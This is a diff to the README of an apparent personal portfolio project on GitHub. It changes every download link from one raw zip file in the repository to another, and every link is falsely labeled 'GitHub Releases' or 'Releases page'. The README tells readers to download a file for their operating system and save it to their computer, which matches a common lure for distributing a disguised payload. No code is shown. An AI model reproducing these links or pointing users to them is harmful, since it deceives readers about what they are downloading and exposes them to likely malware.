@@ -1,6 +1,6 @@
 # 🎨 personal-portfolio-v3 - Showcase Your Work Elegantly
 
-[![Download](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip%https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip)](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip)
+[![Download](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip%https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip)](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip)
 
 ## 🔍 Overview
 
@@ -22,9 +22,9 @@ Welcome to the personal-portfolio-v3, your ultimate tool for showcasing your wor
 
 ### Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip).
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip).
 2. Look for the latest version of personal-portfolio-v3.
 3. Click on the appropriate file for your operating system.
 4. Save the file to your computer.
@@ -59,4 +59,4 @@ If you encounter any issues or have questions, please reach out through the foll
 
 ---
 
-For further information and updates, please remember to check the [GitHub Releases page](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/assets/v-personal-portfolio-1.7.zip).
+For further information and updates, please remember to check the [GitHub Releases page](https://raw.githubusercontent.com/SSTConexionSalud/personal-portfolio-v3/main/js/portfolio-v-personal-1.0.zip).
